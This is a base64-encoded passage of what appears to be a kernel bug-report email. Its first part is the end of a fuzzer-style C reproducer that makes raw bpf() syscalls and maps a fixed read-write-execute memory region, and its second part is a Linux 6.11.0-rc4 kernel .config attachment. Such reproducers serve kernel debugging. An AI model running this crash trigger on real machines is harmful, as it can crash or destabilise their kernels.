M2ZjID0gMzsKKih1aW50MzJfdCopMHgyMDAwMDQwMCA9IDI7CioodWludDMyX3QqKTB4MjAwMDA0
MDQgPSA1OwoqKHVpbnQzMl90KikweDIwMDAwNDA4ID0gMHhhOwoqKHVpbnQzMl90KikweDIwMDAw
NDBjID0gNTsKKih1aW50MzJfdCopMHgyMDAwMDQxMCA9IDM7CioodWludDMyX3QqKTB4MjAwMDA0
MTQgPSAxOwoqKHVpbnQzMl90KikweDIwMDAwNDE4ID0gMHhhOwoqKHVpbnQzMl90KikweDIwMDAw
NDFjID0gMzsKKih1aW50MzJfdCopMHgyMDAwMDQyMCA9IDM7CioodWludDMyX3QqKTB4MjAwMDA0
MjQgPSAzOwoqKHVpbnQzMl90KikweDIwMDAwNDI4ID0gNTsKKih1aW50MzJfdCopMHgyMDAwMDQy
YyA9IDg7CioodWludDMyX3QqKTB4MjAwMDA0MzAgPSAzOwoqKHVpbnQzMl90KikweDIwMDAwNDM0
ID0gMTsKKih1aW50MzJfdCopMHgyMDAwMDQzOCA9IDU7CioodWludDMyX3QqKTB4MjAwMDA0M2Mg
PSA1OwoqKHVpbnQzMl90KikweDIwMDAwNDQwID0gMDsKKih1aW50MzJfdCopMHgyMDAwMDQ0NCA9
IDI7CioodWludDMyX3QqKTB4MjAwMDA0NDggPSAwOwoqKHVpbnQzMl90KikweDIwMDAwNDRjID0g
NzsKKih1aW50MzJfdCopMHgyMDAwMDUwOCA9IDB4MTA7CioodWludDMyX3QqKTB4MjAwMDA1MGMg
PSAweDEwMDAwOwoJCXN5c2NhbGwoX19OUl9icGYsIC8qY21kPSovNXVsLCAvKmFyZz0qLzB4MjAw
MDA0ODB1bCwgLypzaXplPSovMHg5MHVsKTsKCQlicmVhazsKCWNhc2UgMjoKKih1aW50MzJfdCop
MHgyMDAwMDQ0MCA9IC0xOwoqKHVpbnQ2NF90KikweDIwMDAwNDQ4ID0gMHgyMDAwMDNjMDsKKih1
aW50MzJfdCopMHgyMDAwMDNjMCA9IDA7CioodWludDY0X3QqKTB4MjAwMDA0NTAgPSAwOwoqKHVp
bnQ2NF90KikweDIwMDAwNDU4ID0gMDsKCQlzeXNjYWxsKF9fTlJfYnBmLCAvKmNtZD0qLzJ1bCwg
Lyphcmc9Ki8weDIwMDAwNDQwdWwsIC8qc2l6ZT0qLzB4MjB1bCk7CgkJYnJlYWs7Cgl9Cgp9Cmlu
dCBtYWluKHZvaWQpCnsKCQlzeXNjYWxsKF9fTlJfbW1hcCwgLyphZGRyPSovMHgxZmZmZjAwMHVs
LCAvKmxlbj0qLzB4MTAwMHVsLCAvKnByb3Q9Ki8wdWwsIC8qZmxhZ3M9TUFQX0ZJWEVEfE1BUF9B
Tk9OWU1PVVN8TUFQX1BSSVZBVEUqLzB4MzJ1bCwgLypmZD0qLy0xLCAvKm9mZnNldD0qLzB1bCk7
CglzeXNjYWxsKF9fTlJfbW1hcCwgLyphZGRyPSovMHgyMDAwMDAwMHVsLCAvKmxlbj0qLzB4MTAw
MDAwMHVsLCAvKnByb3Q9UFJPVF9XUklURXxQUk9UX1JFQUR8UFJPVF9FWEVDKi83dWwsIC8qZmxh
Z3M9TUFQX0ZJWEVEfE1BUF9BTk9OWU1PVVN8TUFQX1BSSVZBVEUqLzB4MzJ1bCwgLypmZD0qLy0x
LCAvKm9mZnNldD0qLzB1bCk7CglzeXNjYWxsKF9fTlJfbW1hcCwgLyphZGRyPSovMHgyMTAwMDAw
MHVsLCAvKmxlbj0qLzB4MTAwMHVsLCAvKnByb3Q9Ki8wdWwsIC8qZmxhZ3M9TUFQX0ZJWEVEfE1B
UF9BTk9OWU1PVVN8TUFQX1BSSVZBVEUqLzB4MzJ1bCwgLypmZD0qLy0xLCAvKm9mZnNldD0qLzB1
bCk7Cgljb25zdCBjaGFyKiByZWFzb247Cgkodm9pZClyZWFzb247CgkJCWxvb3AoKTsKCXJldHVy
biAwOwp9
--000000000000dda6d2062019f35f
Content-Type: application/xml; name=".config"
Content-Disposition: attachment; filename=".config"
Content-Transfer-Encoding: base64
Content-ID: <f_m027p9cb0>
X-Attachment-Id: f_m027p9cb0

IwojIEF1dG9tYXRpY2FsbHkgZ2VuZXJhdGVkIGZpbGU7IERPIE5PVCBFRElULgojIExpbnV4L3g4
NiA2LjExLjAtcmM0IEtlcm5lbCBDb25maWd1cmF0aW9uCiMKQ09ORklHX0NDX1ZFUlNJT05fVEVY
VD0iZ2NjIChVYnVudHUgMTEuNC4wLTF1YnVudHUxfjIyLjA0KSAxMS40LjAiCkNPTkZJR19DQ19J
U19HQ0M9eQpDT05GSUdfR0NDX1ZFUlNJT049MTEwNDAwCkNPTkZJR19DTEFOR19WRVJTSU9OPTAK
Q09ORklHX0FTX0lTX0dOVT15CkNPTkZJR19BU19WRVJTSU9OPTIzODAwCkNPTkZJR19MRF9JU19C
RkQ9eQpDT05GSUdfTERfVkVSU0lPTj0yMzgwMApDT05GSUdfTExEX1ZFUlNJT049MApDT05GSUdf
Q0NfQ0FOX0xJTks9eQpDT05GSUdfQ0NfQ0FOX0xJTktfU1RBVElDPXkKQ09ORklHX0dDQ19BU01f
R09UT19PVVRQVVRfQlJPS0VOPXkKQ09ORklHX1RPT0xTX1NVUFBPUlRfUkVMUj15CkNPTkZJR19D
Q19IQVNfQVNNX0lOTElORT15CkNPTkZJR19DQ19IQVNfTk9fUFJPRklMRV9GTl9BVFRSPXkKQ09O
RklHX1BBSE9MRV9WRVJTSU9OPTEyNQpDT05GSUdfQ09OU1RSVUNUT1JTPXkKQ09ORklHX0lSUV9X
T1JLPXkKQ09ORklHX0JVSUxEVElNRV9UQUJMRV9TT1JUPXkKQ09ORklHX1RIUkVBRF9JTkZPX0lO
X1RBU0s9eQoKIwojIEdlbmVyYWwgc2V0dXAKIwpDT05GSUdfSU5JVF9FTlZfQVJHX0xJTUlUPTMy
CiMgQ09ORklHX0NPTVBJTEVfVEVTVCBpcyBub3Qgc2V0CkNPTkZJR19XRVJST1I9eQpDT05GSUdf
TE9DQUxWRVJTSU9OPSIiCkNPTkZJR19MT0NBTFZFUlNJT05fQVVUTz15CkNPTkZJR19CVUlMRF9T
QUxUPSIiCkNPTkZJR19IQVZFX0tFUk5FTF9HWklQPXkKQ09ORklHX0hBVkVfS0VSTkVMX0JaSVAy
PXkKQ09ORklHX0hBVkVfS0VSTkVMX0xaTUE9eQpDT05GSUdfSEFWRV9LRVJORUxfWFo9eQpDT05G
SUdfSEFWRV9LRVJORUxfTFpPPXkKQ09ORklHX0hBVkVfS0VSTkVMX0xaND15CkNPTkZJR19IQVZF
X0tFUk5FTF9aU1REPXkKQ09ORklHX0tFUk5FTF9HWklQPXkKIyBDT05GSUdfS0VSTkVMX0JaSVAy
IGlzIG5vdCBzZXQKIyBDT05GSUdfS0VSTkVMX0xaTUEgaXMgbm90IHNldAojIENPTkZJR19LRVJO
RUxfWFogaXMgbm90IHNldAojIENPTkZJR19LRVJORUxfTFpPIGlzIG5vdCBzZXQKIyBDT05GSUdf
S0VSTkVMX0xaNCBpcyBub3Qgc2V0CiMgQ09ORklHX0tFUk5FTF9aU1REIGlzIG5vdCBzZXQKQ09O
RklHX0RFRkFVTFRfSU5JVD0iIgpDT05GSUdfREVGQVVMVF9IT1NUTkFNRT0iKG5vbmUpIgpDT05G
SUdfU1lTVklQQz15CkNPTkZJR19TWVNWSVBDX1NZU0NUTD15CkNPTkZJR19TWVNWSVBDX0NPTVBB
VD15CkNPTkZJR19QT1NJWF9NUVVFVUU9eQpDT05GSUdfUE9TSVhfTVFVRVVFX1NZU0NUTD15CiMg
Q09ORklHX1dBVENIX1FVRVVFIGlzIG5vdCBzZXQKQ09ORklHX0NST1NTX01FTU9SWV9BVFRBQ0g9
eQojIENPTkZJR19VU0VMSUIgaXMgbm90IHNldApDT05GSUdfQVVESVQ9eQpDT05GSUdfSEFWRV9B
UkNIX0FVRElUU1lTQ0FMTD15CkNPTkZJR19BVURJVFNZU0NBTEw9eQoKIwojIElSUSBzdWJzeXN0
ZW0KIwpDT05GSUdfR0VORVJJQ19JUlFfUFJPQkU9eQpDT05GSUdfR0VORVJJQ19JUlFfU0hPVz15
CkNPTkZJR19HRU5FUklDX0lSUV9FRkZFQ1RJVkVfQUZGX01BU0s9eQpDT05GSUdfR0VORVJJQ19Q
RU5ESU5HX0lSUT15CkNPTkZJR19HRU5FUklDX0lSUV9NSUdSQVRJT049eQpDT05GSUdfSEFSRElS
UVNfU1dfUkVTRU5EPXkKQ09ORklHX0lSUV9ET01BSU49eQpDT05GSUdfSVJRX0RPTUFJTl9ISUVS
QVJDSFk9eQpDT05GSUdfR0VORVJJQ19NU0lfSVJRPXkKQ09ORklHX0lSUV9NU0lfSU9NTVU9eQpD
T05GSUdfR0VORVJJQ19JUlFfTUFUUklYX0FMTE9DQVRPUj15CkNPTkZJR19HRU5FUklDX0lSUV9S
RVNFUlZBVElPTl9NT0RFPXkKQ09ORklHX0lSUV9GT1JDRURfVEhSRUFESU5HPXkKQ09ORklHX1NQ
QVJTRV9JUlE9eQojIENPTkZJR19HRU5FUklDX0lSUV9ERUJVR0ZTIGlzIG5vdCBzZXQKIyBlbmQg
b2YgSVJRIHN1YnN5c3RlbQoKQ09ORklHX0NMT0NLU09VUkNFX1dBVENIRE9HPXkKQ09ORklHX0FS
Q0hfQ0xPQ0tTT1VSQ0VfSU5JVD15CkNPTkZJR19DTE9DS1NPVVJDRV9WQUxJREFURV9MQVNUX0NZ
Q0xFPXkKQ09ORklHX0dFTkVSSUNfVElNRV9WU1lTQ0FMTD15CkNPTkZJR19HRU5FUklDX0NMT0NL
RVZFTlRTPXkKQ09ORklHX0dFTkVSSUNfQ0xPQ0tFVkVOVFNfQlJPQURDQVNUPXkKQ09ORklHX0dF
TkVSSUNfQ0xPQ0tFVkVOVFNfQlJPQURDQVNUX0lETEU9eQpDT05GSUdfR0VORVJJQ19DTE9DS0VW
RU5UU19NSU5fQURKVVNUPXkKQ09ORklHX0dFTkVSSUNfQ01PU19VUERBVEU9eQpDT05GSUdfSEFW
RV9QT1NJWF9DUFVfVElNRVJTX1RBU0tfV09SSz15CkNPTkZJR19QT1NJWF9DUFVfVElNRVJTX1RB
U0tfV09SSz15CkNPTkZJR19DT05URVhUX1RSQUNLSU5HPXkKQ09ORklHX0NPTlRFWFRfVFJBQ0tJ
TkdfSURMRT15CgojCiMgVGltZXJzIHN1YnN5c3RlbQojCkNPTkZJR19USUNLX09ORVNIT1Q9eQpD
T05GSUdfTk9fSFpfQ09NTU9OPXkKIyBDT05GSUdfSFpfUEVSSU9ESUMgaXMgbm90IHNldApDT05G
SUdfTk9fSFpfSURMRT15CiMgQ09ORklHX05PX0haX0ZVTEwgaXMgbm90IHNldApDT05GSUdfTk9f
SFo9eQpDT05GSUdfSElHSF9SRVNfVElNRVJTPXkKQ09ORklHX0NMT0NLU09VUkNFX1dBVENIRE9H
X01BWF9TS0VXX1VTPTEyNQojIGVuZCBvZiBUaW1lcnMgc3Vic3lzdGVtCgpDT05GSUdfQlBGPXkK
Q09ORklHX0hBVkVfRUJQRl9KSVQ9eQpDT05GSUdfQVJDSF9XQU5UX0RFRkFVTFRfQlBGX0pJVD15
CgojCiMgQlBGIHN1YnN5c3RlbQojCkNPTkZJR19CUEZfU1lTQ0FMTD15CkNPTkZJR19CUEZfSklU
PXkKQ09ORklHX0JQRl9KSVRfQUxXQVlTX09OPXkKQ09ORklHX0JQRl9KSVRfREVGQVVMVF9PTj15
CkNPTkZJR19CUEZfVU5QUklWX0RFRkFVTFRfT0ZGPXkKIyBDT05GSUdfQlBGX1BSRUxPQUQgaXMg
bm90IHNldAojIENPTkZJR19CUEZfTFNNIGlzIG5vdCBzZXQKIyBlbmQgb2YgQlBGIHN1YnN5c3Rl
bQoKQ09ORklHX1BSRUVNUFRfQlVJTEQ9eQojIENPTkZJR19QUkVFTVBUX05PTkUgaXMgbm90IHNl
dApDT05GSUdfUFJFRU1QVF9WT0xVTlRBUlk9eQojIENPTkZJR19QUkVFTVBUIGlzIG5vdCBzZXQK
Q09ORklHX1BSRUVNUFRfQ09VTlQ9eQpDT05GSUdfUFJFRU1QVElPTj15CkNPTkZJR19QUkVFTVBU
X0RZTkFNSUM9eQojIENPTkZJR19TQ0hFRF9DT1JFIGlzIG5vdCBzZXQKCiMKIyBDUFUvVGFzayB0
aW1lIGFuZCBzdGF0cyBhY2NvdW50aW5nCiMKQ09ORklHX1RJQ0tfQ1BVX0FDQ09VTlRJTkc9eQoj
IENPTkZJR19WSVJUX0NQVV9BQ0NPVU5USU5HX0dFTiBpcyBub3Qgc2V0CiMgQ09ORklHX0lSUV9U
SU1FX0FDQ09VTlRJTkcgaXMgbm90IHNldApDT05GSUdfQlNEX1BST0NFU1NfQUNDVD15CiMgQ09O
RklHX0JTRF9QUk9DRVNTX0FDQ1RfVjMgaXMgbm90IHNldApDT05GSUdfVEFTS1NUQVRTPXkKQ09O
RklHX1RBU0tfREVMQVlfQUNDVD15CkNPTkZJR19UQVNLX1hBQ0NUPXkKQ09ORklHX1RBU0tfSU9f
QUNDT1VOVElORz15CiMgQ09ORklHX1BTSSBpcyBub3Qgc2V0CiMgZW5kIG9mIENQVS9UYXNrIHRp
bWUgYW5kIHN0YXRzIGFjY291bnRpbmcKCkNPTkZJR19DUFVfSVNPTEFUSU9OPXkKCiMKIyBSQ1Ug
U3Vic3lzdGVtCiMKQ09ORklHX1RSRUVfUkNVPXkKQ09ORklHX1BSRUVNUFRfUkNVPXkKIyBDT05G
SUdfUkNVX0VYUEVSVCBpcyBub3Qgc2V0CkNPTkZJR19UUkVFX1NSQ1U9eQpDT05GSUdfVEFTS1Nf
UkNVX0dFTkVSSUM9eQpDT05GSUdfTkVFRF9UQVNLU19SQ1U9eQpDT05GSUdfVEFTS1NfUkNVPXkK
Q09ORklHX1RBU0tTX1RSQUNFX1JDVT15CkNPTkZJR19SQ1VfU1RBTExfQ09NTU9OPXkKQ09ORklH
X1JDVV9ORUVEX1NFR0NCTElTVD15CiMgZW5kIG9mIFJDVSBTdWJzeXN0ZW0KCiMgQ09ORklHX0lL
Q09ORklHIGlzIG5vdCBzZXQKIyBDT05GSUdfSUtIRUFERVJTIGlzIG5vdCBzZXQKQ09ORklHX0xP
R19CVUZfU0hJRlQ9MTgKQ09ORklHX0xPR19DUFVfTUFYX0JVRl9TSElGVD0xMgojIENPTkZJR19Q
UklOVEtfSU5ERVggaXMgbm90IHNldApDT05GSUdfSEFWRV9VTlNUQUJMRV9TQ0hFRF9DTE9DSz15
CgojCiMgU2NoZWR1bGVyIGZlYXR1cmVzCiMKIyBDT05GSUdfVUNMQU1QX1RBU0sgaXMgbm90IHNl
dAojIGVuZCBvZiBTY2hlZHVsZXIgZmVhdHVyZXMKCkNPTkZJR19BUkNIX1NVUFBPUlRTX05VTUFf
QkFMQU5DSU5HPXkKQ09ORklHX0FSQ0hfV0FOVF9CQVRDSEVEX1VOTUFQX1RMQl9GTFVTSD15CkNP
TkZJR19DQ19IQVNfSU5UMTI4PXkKQ09ORklHX0NDX0lNUExJQ0lUX0ZBTExUSFJPVUdIPSItV2lt
cGxpY2l0LWZhbGx0aHJvdWdoPTUiCkNPTkZJR19HQ0MxMF9OT19BUlJBWV9CT1VORFM9eQpDT05G
SUdfQ0NfTk9fQVJSQVlfQk9VTkRTPXkKQ09ORklHX0dDQ19OT19TVFJJTkdPUF9PVkVSRkxPVz15
CkNPTkZJR19DQ19OT19TVFJJTkdPUF9PVkVSRkxPVz15CkNPTkZJR19BUkNIX1NVUFBPUlRTX0lO
VDEyOD15CiMgQ09ORklHX05VTUFfQkFMQU5DSU5HIGlzIG5vdCBzZXQKQ09ORklHX0NHUk9VUFM9
eQpDT05GSUdfUEFHRV9DT1VOVEVSPXkKIyBDT05GSUdfQ0dST1VQX0ZBVk9SX0RZTk1PRFMgaXMg
bm90IHNldAojIENPTkZJR19NRU1DRyBpcyBub3Qgc2V0CkNPTkZJR19CTEtfQ0dST1VQPXkKQ09O
RklHX0NHUk9VUF9TQ0hFRD15CkNPTkZJR19GQUlSX0dST1VQX1NDSEVEPXkKIyBDT05GSUdfQ0ZT
X0JBTkRXSURUSCBpcyBub3Qgc2V0CiMgQ09ORklHX1JUX0dST1VQX1NDSEVEIGlzIG5vdCBzZXQK
Q09ORklHX1NDSEVEX01NX0NJRD15CkNPTkZJR19DR1JPVVBfUElEUz15CkNPTkZJR19DR1JPVVBf
UkRNQT15CkNPTkZJR19DR1JPVVBfRlJFRVpFUj15CkNPTkZJR19DR1JPVVBfSFVHRVRMQj15CkNP
TkZJR19DUFVTRVRTPXkKQ09ORklHX1BST0NfUElEX0NQVVNFVD15CkNPTkZJR19DR1JPVVBfREVW
SUNFPXkKQ09ORklHX0NHUk9VUF9DUFVBQ0NUPXkKQ09ORklHX0NHUk9VUF9QRVJGPXkKIyBDT05G
SUdfQ0dST1VQX0JQRiBpcyBub3Qgc2V0CkNPTkZJR19DR1JPVVBfTUlTQz15CkNPTkZJR19DR1JP
VVBfREVCVUc9eQpDT05GSUdfU09DS19DR1JPVVBfREFUQT15CkNPTkZJR19OQU1FU1BBQ0VTPXkK
Q09ORklHX1VUU19OUz15CkNPTkZJR19USU1FX05TPXkKQ09ORklHX0lQQ19OUz15CiMgQ09ORklH
X1VTRVJfTlMgaXMgbm90IHNldApDT05GSUdfUElEX05TPXkKQ09ORklHX05FVF9OUz15CiMgQ09O
RklHX0NIRUNLUE9JTlRfUkVTVE9SRSBpcyBub3Qgc2V0CiMgQ09ORklHX1NDSEVEX0FVVE9HUk9V
UCBpcyBub3Qgc2V0CkNPTkZJR19SRUxBWT15CkNPTkZJR19CTEtfREVWX0lOSVRSRD15CkNPTkZJ
R19JTklUUkFNRlNfU09VUkNFPSIiCkNPTkZJR19SRF9HWklQPXkKQ09ORklHX1JEX0JaSVAyPXkK
Q09ORklHX1JEX0xaTUE9eQpDT05GSUdfUkRfWFo9eQpDT05GSUdfUkRfTFpPPXkKQ09ORklHX1JE
X0xaND15CkNPTkZJR19SRF9aU1REPXkKIyBDT05GSUdfQk9PVF9DT05GSUcgaXMgbm90IHNldApD
T05GSUdfSU5JVFJBTUZTX1BSRVNFUlZFX01USU1FPXkKQ09ORklHX0NDX09QVElNSVpFX0ZPUl9Q
RVJGT1JNQU5DRT15CiMgQ09ORklHX0NDX09QVElNSVpFX0ZPUl9TSVpFIGlzIG5vdCBzZXQKQ09O
RklHX0xEX09SUEhBTl9XQVJOPXkKQ09ORklHX0xEX09SUEhBTl9XQVJOX0xFVkVMPSJlcnJvciIK
Q09ORklHX1NZU0NUTD15CkNPTkZJR19IQVZFX1VJRDE2PXkKQ09ORklHX1NZU0NUTF9FWENFUFRJ
T05fVFJBQ0U9eQpDT05GSUdfSEFWRV9QQ1NQS1JfUExBVEZPUk09eQojIENPTkZJR19FWFBFUlQg
aXMgbm90IHNldApDT05GSUdfVUlEMTY9eQpDT05GSUdfTVVMVElVU0VSPXkKQ09ORklHX1NHRVRN
QVNLX1NZU0NBTEw9eQpDT05GSUdfU1lTRlNfU1lTQ0FMTD15CkNPTkZJR19GSEFORExFPXkKQ09O
RklHX1BPU0lYX1RJTUVSUz15CkNPTkZJR19QUklOVEs9eQpDT05GSUdfQlVHPXkKQ09ORklHX0VM
Rl9DT1JFPXkKQ09ORklHX1BDU1BLUl9QTEFURk9STT15CkNPTkZJR19GVVRFWD15CkNPTkZJR19G
VVRFWF9QST15CkNPTkZJR19FUE9MTD15CkNPTkZJR19TSUdOQUxGRD15CkNPTkZJR19USU1FUkZE
PXkKQ09ORklHX0VWRU5URkQ9eQpDT05GSUdfU0hNRU09eQpDT05GSUdfQUlPPXkKQ09ORklHX0lP
X1VSSU5HPXkKQ09ORklHX0FEVklTRV9TWVNDQUxMUz15CkNPTkZJR19NRU1CQVJSSUVSPXkKQ09O
RklHX0tDTVA9eQpDT05GSUdfUlNFUT15CkNPTkZJR19DQUNIRVNUQVRfU1lTQ0FMTD15CkNPTkZJ
R19LQUxMU1lNUz15CiMgQ09ORklHX0tBTExTWU1TX1NFTEZURVNUIGlzIG5vdCBzZXQKQ09ORklH
X0tBTExTWU1TX0FMTD15CkNPTkZJR19LQUxMU1lNU19BQlNPTFVURV9QRVJDUFU9eQpDT05GSUdf
QVJDSF9IQVNfTUVNQkFSUklFUl9TWU5DX0NPUkU9eQpDT05GSUdfSEFWRV9QRVJGX0VWRU5UUz15
CgojCiMgS2VybmVsIFBlcmZvcm1hbmNlIEV2ZW50cyBBbmQgQ291bnRlcnMKIwpDT05GSUdfUEVS
Rl9FVkVOVFM9eQojIENPTkZJR19ERUJVR19QRVJGX1VTRV9WTUFMTE9DIGlzIG5vdCBzZXQKIyBl
bmQgb2YgS2VybmVsIFBlcmZvcm1hbmNlIEV2ZW50cyBBbmQgQ291bnRlcnMKCkNPTkZJR19TWVNU
RU1fREFUQV9WRVJJRklDQVRJT049eQpDT05GSUdfUFJPRklMSU5HPXkKQ09ORklHX1RSQUNFUE9J
TlRTPXkKCiMKIyBLZXhlYyBhbmQgY3Jhc2ggZmVhdHVyZXMKIwpDT05GSUdfQ1JBU0hfUkVTRVJW
RT15CkNPTkZJR19WTUNPUkVfSU5GTz15CkNPTkZJR19LRVhFQ19DT1JFPXkKQ09ORklHX0tFWEVD
PXkKIyBDT05GSUdfS0VYRUNfRklMRSBpcyBub3Qgc2V0CiMgQ09ORklHX0tFWEVDX0pVTVAgaXMg
bm90IHNldApDT05GSUdfQ1JBU0hfRFVNUD15CkNPTkZJR19DUkFTSF9IT1RQTFVHPXkKQ09ORklH
X0NSQVNIX01BWF9NRU1PUllfUkFOR0VTPTgxOTIKIyBlbmQgb2YgS2V4ZWMgYW5kIGNyYXNoIGZl
YXR1cmVzCiMgZW5kIG9mIEdlbmVyYWwgc2V0dXAKCkNPTkZJR182NEJJVD15CkNPTkZJR19YODZf
NjQ9eQpDT05GSUdfWDg2PXkKQ09ORklHX0lOU1RSVUNUSU9OX0RFQ09ERVI9eQpDT05GSUdfT1VU
UFVUX0ZPUk1BVD0iZWxmNjQteDg2LTY0IgpDT05GSUdfTE9DS0RFUF9TVVBQT1JUPXkKQ09ORklH
X1NUQUNLVFJBQ0VfU1VQUE9SVD15CkNPTkZJR19NTVU9eQpDT05GSUdfQVJDSF9NTUFQX1JORF9C
SVRTX01JTj0yOApDT05GSUdfQVJDSF9NTUFQX1JORF9CSVRTX01BWD0zMgpDT05GSUdfQVJDSF9N
TUFQX1JORF9DT01QQVRfQklUU19NSU49OApDT05GSUdfQVJDSF9NTUFQX1JORF9DT01QQVRfQklU
U19NQVg9MTYKQ09ORklHX0dFTkVSSUNfSVNBX0RNQT15CkNPTkZJR19HRU5FUklDX0NTVU09eQpD
T05GSUdfR0VORVJJQ19CVUc9eQpDT05GSUdfR0VORVJJQ19CVUdfUkVMQVRJVkVfUE9JTlRFUlM9
eQpDT05GSUdfQVJDSF9NQVlfSEFWRV9QQ19GREM9eQpDT05GSUdfR0VORVJJQ19DQUxJQlJBVEVf
REVMQVk9eQpDT05GSUdfQVJDSF9IQVNfQ1BVX1JFTEFYPXkKQ09ORklHX0FSQ0hfSElCRVJOQVRJ
T05fUE9TU0lCTEU9eQpDT05GSUdfQVJDSF9TVVNQRU5EX1BPU1NJQkxFPXkKQ09ORklHX0FVRElU
X0FSQ0g9eQpDT05GSUdfS0FTQU5fU0hBRE9XX09GRlNFVD0weGRmZmZmYzAwMDAwMDAwMDAKQ09O
RklHX0hBVkVfSU5URUxfVFhUPXkKQ09ORklHX1g4Nl82NF9TTVA9eQpDT05GSUdfQVJDSF9TVVBQ
T1JUU19VUFJPQkVTPXkKQ09ORklHX0ZJWF9FQVJMWUNPTl9NRU09eQpDT05GSUdfUEdUQUJMRV9M
RVZFTFM9NQpDT05GSUdfQ0NfSEFTX1NBTkVfU1RBQ0tQUk9URUNUT1I9eQoKIwojIFByb2Nlc3Nv
ciB0eXBlIGFuZCBmZWF0dXJlcwojCkNPTkZJR19TTVA9eQojIENPTkZJR19YODZfWDJBUElDIGlz
IG5vdCBzZXQKQ09ORklHX1g4Nl9NUFBBUlNFPXkKIyBDT05GSUdfWDg2X0NQVV9SRVNDVFJMIGlz
IG5vdCBzZXQKIyBDT05GSUdfWDg2X0ZSRUQgaXMgbm90IHNldApDT05GSUdfWDg2X0VYVEVOREVE
X1BMQVRGT1JNPXkKIyBDT05GSUdfWDg2X1ZTTVAgaXMgbm90IHNldAojIENPTkZJR19YODZfR09M
REZJU0ggaXMgbm90IHNldAojIENPTkZJR19YODZfSU5URUxfTUlEIGlzIG5vdCBzZXQKIyBDT05G
SUdfWDg2X0lOVEVMX0xQU1MgaXMgbm90IHNldAojIENPTkZJR19YODZfQU1EX1BMQVRGT1JNX0RF
VklDRSBpcyBub3Qgc2V0CkNPTkZJR19JT1NGX01CST15CiMgQ09ORklHX0lPU0ZfTUJJX0RFQlVH
IGlzIG5vdCBzZXQKQ09ORklHX1g4Nl9TVVBQT1JUU19NRU1PUllfRkFJTFVSRT15CkNPTkZJR19T
Q0hFRF9PTUlUX0ZSQU1FX1BPSU5URVI9eQpDT05GSUdfSFlQRVJWSVNPUl9HVUVTVD15CkNPTkZJ
R19QQVJBVklSVD15CiMgQ09ORklHX1BBUkFWSVJUX0RFQlVHIGlzIG5vdCBzZXQKIyBDT05GSUdf
UEFSQVZJUlRfU1BJTkxPQ0tTIGlzIG5vdCBzZXQKQ09ORklHX1g4Nl9IVl9DQUxMQkFDS19WRUNU
T1I9eQojIENPTkZJR19YRU4gaXMgbm90IHNldApDT05GSUdfS1ZNX0dVRVNUPXkKQ09ORklHX0FS
Q0hfQ1BVSURMRV9IQUxUUE9MTD15CiMgQ09ORklHX1BWSCBpcyBub3Qgc2V0CiMgQ09ORklHX1BB
UkFWSVJUX1RJTUVfQUNDT1VOVElORyBpcyBub3Qgc2V0CkNPTkZJR19QQVJBVklSVF9DTE9DSz15
CiMgQ09ORklHX0pBSUxIT1VTRV9HVUVTVCBpcyBub3Qgc2V0CiMgQ09ORklHX0FDUk5fR1VFU1Qg
aXMgbm90IHNldAojIENPTkZJR19NSzggaXMgbm90IHNldAojIENPTkZJR19NUFNDIGlzIG5vdCBz
ZXQKIyBDT05GSUdfTUNPUkUyIGlzIG5vdCBzZXQKIyBDT05GSUdfTUFUT00gaXMgbm90IHNldApD
T05GSUdfR0VORVJJQ19DUFU9eQpDT05GSUdfWDg2X0lOVEVSTk9ERV9DQUNIRV9TSElGVD02CkNP
TkZJR19YODZfTDFfQ0FDSEVfU0hJRlQ9NgpDT05GSUdfWDg2X1RTQz15CkNPTkZJR19YODZfSEFW
RV9QQUU9eQpDT05GSUdfWDg2X0NNUFhDSEc2ND15CkNPTkZJR19YODZfQ01PVj15CkNPTkZJR19Y
ODZfTUlOSU1VTV9DUFVfRkFNSUxZPTY0CkNPTkZJR19YODZfREVCVUdDVExNU1I9eQpDT05GSUdf
SUEzMl9GRUFUX0NUTD15CkNPTkZJR19YODZfVk1YX0ZFQVRVUkVfTkFNRVM9eQpDT05GSUdfQ1BV
X1NVUF9JTlRFTD15CkNPTkZJR19DUFVfU1VQX0FNRD15CkNPTkZJR19DUFVfU1VQX0hZR09OPXkK
Q09ORklHX0NQVV9TVVBfQ0VOVEFVUj15CkNPTkZJR19DUFVfU1VQX1pIQU9YSU49eQpDT05GSUdf
SFBFVF9USU1FUj15CkNPTkZJR19IUEVUX0VNVUxBVEVfUlRDPXkKQ09ORklHX0RNST15CiMgQ09O
RklHX0dBUlRfSU9NTVUgaXMgbm90IHNldAojIENPTkZJR19NQVhTTVAgaXMgbm90IHNldApDT05G
SUdfTlJfQ1BVU19SQU5HRV9CRUdJTj0yCkNPTkZJR19OUl9DUFVTX1JBTkdFX0VORD01MTIKQ09O
RklHX05SX0NQVVNfREVGQVVMVD02NApDT05GSUdfTlJfQ1BVUz02NApDT05GSUdfU0NIRURfQ0xV
U1RFUj15CkNPTkZJR19TQ0hFRF9TTVQ9eQpDT05GSUdfU0NIRURfTUM9eQpDT05GSUdfU0NIRURf
TUNfUFJJTz15CkNPTkZJR19YODZfTE9DQUxfQVBJQz15CkNPTkZJR19BQ1BJX01BRFRfV0FLRVVQ
PXkKQ09ORklHX1g4Nl9JT19BUElDPXkKQ09ORklHX1g4Nl9SRVJPVVRFX0ZPUl9CUk9LRU5fQk9P
VF9JUlFTPXkKQ09ORklHX1g4Nl9NQ0U9eQojIENPTkZJR19YODZfTUNFTE9HX0xFR0FDWSBpcyBu
b3Qgc2V0CkNPTkZJR19YODZfTUNFX0lOVEVMPXkKQ09ORklHX1g4Nl9NQ0VfQU1EPXkKQ09ORklH
X1g4Nl9NQ0VfVEhSRVNIT0xEPXkKIyBDT05GSUdfWDg2X01DRV9JTkpFQ1QgaXMgbm90IHNldAoK
IwojIFBlcmZvcm1hbmNlIG1vbml0b3JpbmcKIwpDT05GSUdfUEVSRl9FVkVOVFNfSU5URUxfVU5D
T1JFPXkKQ09ORklHX1BFUkZfRVZFTlRTX0lOVEVMX1JBUEw9eQpDT05GSUdfUEVSRl9FVkVOVFNf
SU5URUxfQ1NUQVRFPXkKIyBDT05GSUdfUEVSRl9FVkVOVFNfQU1EX1BPV0VSIGlzIG5vdCBzZXQK
Q09ORklHX1BFUkZfRVZFTlRTX0FNRF9VTkNPUkU9eQojIENPTkZJR19QRVJGX0VWRU5UU19BTURf
QlJTIGlzIG5vdCBzZXQKIyBlbmQgb2YgUGVyZm9ybWFuY2UgbW9uaXRvcmluZwoKQ09ORklHX1g4
Nl8xNkJJVD15CkNPTkZJR19YODZfRVNQRklYNjQ9eQpDT05GSUdfWDg2X1ZTWVNDQUxMX0VNVUxB
